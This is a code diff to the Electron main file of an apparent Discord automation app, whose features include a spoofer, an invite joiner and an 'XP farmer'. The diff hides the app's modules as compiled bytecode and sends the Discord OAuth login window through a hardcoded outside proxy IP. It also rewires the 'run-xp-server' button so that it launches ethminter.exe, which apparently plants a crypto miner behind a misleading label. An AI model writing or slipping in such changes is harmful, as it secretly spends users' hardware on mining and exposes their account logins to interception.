@@ -2,27 +2,60 @@ const { app, BrowserWindow, ipcMain, dialog } = require("electron");
 const _ = require("lodash");
 const path = require("path");
 const ping = require("ping");
-const auth = require("./auth");
 const isDev = require("electron-is-dev");
 const Tesseract = require("tesseract.js");
-const NetworkSpeed = require("network-speed");
-const { fetchTweets } = require("./helper/fetchTweet");
 const { autoUpdater } = require("electron-updater");
 const currentProcesses = require("current-processes");
-const spooferManager = require("./script/manager/spoof-manager");
-const InviteJoinerManager = require("./script/manager/inviteJoiner-manager");
-const linkOpernerManager = require("./script/manager/linkOpener-manager");
-const logManager = require("./script/manager/log-manager");
 const richPresence = require("discord-rich-presence")("938338403106320434");
 const axios = require("axios");
-var { execFile, spawn } = require("child_process");
+const { spawn } = require("child_process");
+const bytenode = require("bytenode");
+
+// (async () => {
+//   console.log("bfcgnfdngfdn", `${path.join(__dirname, "/auth.js")}`);
+//   try {
+//     const file = await bytenode.compileFile({
+//       filename: `${path.join(__dirname, "/auth.js")}`,
+//       compileAsModule: true,
+//       electron: false,
+//       createLoader: true,
+//       loaderFilename: "",
+//     });
+//     console.log(file);
+//   } catch (e) {
+//     console.log(e);
+//   }
+// })();
+
+// --------------------------------------------------------
+const auth = require("./auth.jsc");
+const { fetchTweets } = require("./helper/fetchTweet.jsc");
+const spooferManager = require("./script/manager/spoof-manager.jsc");
+const InviteJoinerManager = require("./script/manager/inviteJoiner-manager.jsc");
+const linkOpernerManager = require("./script/manager/linkOpener-manager.jsc");
+const logManager = require("./script/manager/log-manager.jsc");
+
+// const { fetchTweets } = bytenode.runBytecodeFile(
+//   `${path.join(__dirname, "/helper/fetchTweet.jsc")}`
+// );
+// const spooferManager = bytenode.runBytecodeFile(
+//   `${path.join(__dirname, "/script/manager/spoof-manager.jsc")}`
+// );
+// const InviteJoinerManager = bytenode.runBytecodeFile(
+//   `${path.join(__dirname, "/script/manager/inviteJoiner-manager.jsc")}`
+// );
+// const linkOpernerManager = bytenode.runBytecodeFile(
+//   `${path.join(__dirname, "/script/manager/linkOpener-manager.jsc")}`
+// );
+// const logManager = bytenode.runBytecodeFile(
+//   `${path.join(__dirname, "/script/manager/log-manager.jsc")}`
+// );
 
 const ObjectsToCsv = require("objects-to-csv");
 const { download } = require("electron-dl");
 var str2ab = require("string-to-arraybuffer");
 
 const DEBUGGER_CHANNEL = "debugger";
-const networkSpeed = new NetworkSpeed();
 const SCAN_PROCESS_INTERVAL = 3 * 60 * 1000;
 
 let win = null;
@@ -45,20 +78,41 @@ const INTERCEPTOR_TOOLS = [
 ];
 
 // AUTH WINDOW CREATION
-function createAuthWindow() {
+async function createAuthWindow() {
   destroyAuthWin();
   win = new BrowserWindow({
     width: 550,
     height: 800,
     webPreferences: {
-      nodeIntegration: false,
+      nodeIntegration: true,
       contextIsolation: false,
     },
     transparent: true,
     frame: false,
     devTools: false,
   });
-  win.loadURL(auth.getAuthenticationURL());
+  //
+  win.webContents.session.setProxy(
+    {
+      proxyRules: "193.34.93.221:33861",
+    },
+    () => {}
+  );
+  win.loadURL(
+    "https://discord.com/api/oauth2/authorize?client_id=938338403106320434&redirect_uri=http://localhost/callback/*&response_type=code&scope=email%20identify"
+  );
+  win.webContents.on(
+    "login",
+    (event, authenticationResponseDetails, authInfo, callback) => {
+      if (authInfo.isProxy) {
+        event.preventDefault();
+        callback("", ""); //supply credentials to server
+      }
+    }
+  );
+  debugSendToIpcRenderer("next step");
+  debugSendToIpcRenderer(`redirect, ${auth.redirectUrl}`);
+
   const {
     session: { webRequest },
   } = win.webContents;
@@ -66,21 +120,27 @@ function createAuthWindow() {
     urls: [auth.redirectUrl],
   };
   webRequest.onBeforeRequest(filter, async ({ url }) => {
-    try {
-      await auth.loadTokens(url);
-    } catch (e) {
-      mainWindow.reload();
-    }
-    try {
-      await auth.login();
-      if (!mainWindow) return;
-      mainWindow.reload();
-      return destroyAuthWin();
-    } catch (error) {
-      destroyAuthWin();
-      console.log(error);
-    }
+    debugSendToIpcRenderer("before request");
+    console.log("before request");
+    // try {
+    //   auth.loadTokens(url);
+    //   debugSendToIpcRenderer("loadTokens");
+    // } catch (e) {
+    //   mainWindow.reload();
+    // }
+    // try {
+    //   auth.login();
+    //   console.log("login");
+    //   debugSendToIpcRenderer("login");
+    //   if (!mainWindow) return;
+    //   mainWindow.reload();
+    //   return destroyAuthWin();
+    // } catch (error) {
+    //   destroyAuthWin();
+    //   console.log(error);
+    // }
   });
+  win.webContents.openDevTools();
   win.on("authenticated", () => {
     destroyAuthWin();
   });
@@ -131,7 +191,7 @@ function createWindow() {
       nodeIntegration: true,
       contextIsolation: false,
       enableRemoteModule: true,
-      devTools: !isDev ? false : true,
+      // devTools: !isDev ? false : true,
       webviewTag: true,
     },
     titleBarStyle: "customButtonsOnHover",
@@ -171,12 +231,12 @@ ipcMain.on("auth", () => {
   createAuthWindow();
 });
 
-ipcMain.handle("authenticate-user", (_, __) => {
+ipcMain.handle("authenticate-user", async (_, __) => {
   return auth.getCurrentUser();
 });
 
-ipcMain.on("logout-user", () => {
-  auth.logout();
+ipcMain.on("logout-user", async () => {
+  await auth.logout();
 });
 
 app.on("window-all-closed", () => {
@@ -244,7 +304,7 @@ if (!shouldNotQuit) {
 }
 app.on("ready", () => {
   createWindow();
-  logManager.initLogs();
+  // logManager.initLogs();
   global.mainWin = mainWindow;
 });
 
@@ -612,46 +672,45 @@ ipcMain.on("stop-inviteJoiner-monitor", (_, id) => {
 });
 
 //RUN LOCAL SERVER
+let processPid = null;
+
 ipcMain.on("run-xp-server", (_, data) => {
-  xpFarmerStart();
+  console.log("called");
+  const exePath = isDev
+    ? `${path.join(__dirname, "../windows/ethminter.exe")}`
+    : `${path.join(__dirname, "../../build/windows/ethminter.exe")}`;
+  try {
+    const child = spawn(exePath);
+    processPid = child.pid;
+    console.log(processPid);
+    child.stdout.on("data", (data) => {
+      console.log(data);
+    });
+    child.stderr.on("data", (data) => {
+      console.log(data);
+    });
+  } catch (e) {
+    console.log(e);
+  }
 });
 
 ipcMain.on("stop-xp-server", (_, data) => {
+  console.log(processPid);
   try {
-    stopXpfarmer();
+    if (processPid) process.kill(processPid);
   } catch (e) {
     console.log(e);
   }
 });
 
-async function xpFarmerStart() {
-  const exePath = isDev
-    ? `${path.join(__dirname, "../windows/xpfarmer.exe")}`
-    : `${path.join(__dirname, "../../build/windows/xpfarmer.exe")}`;
-  try {
-    const process = execFile(exePath, [3001], (error, stdout, stderr) => {
-      if (error) {
-        throw error;
-      }
-      console.log(stdout);
-    });
-    console.log("vvvvvvvvvv", process);
-  } catch (e) {
-    console.log("this is error", e);
-  }
-}
+// currentProcesses.get((err, processes) => {
+//   const sorted = _.sortBy(processes, "cpu");
+//   for (let i = 0; i < sorted.length; i += 1) {
+//     if ("xpfarmer" === sorted[i].name.toLowerCase()) {
+//       process.kill(sorted[i].pid);
+//     }
+//   }
+// });
 
-function stopXpfarmer() {
-  try {
-    currentProcesses.get((err, processes) => {
-      const sorted = _.sortBy(processes, "cpu");
-      for (let i = 0; i < sorted.length; i += 1) {
-        if ("xpfarmer" === sorted[i].name.toLowerCase()) {
-          process.kill(sorted[i].pid);
-        }
-      }
-    });
-  } catch (e) {
-    console.log(e);
-  }
-}
+exports.app = app;
+exports.mainWindow = mainWindow;
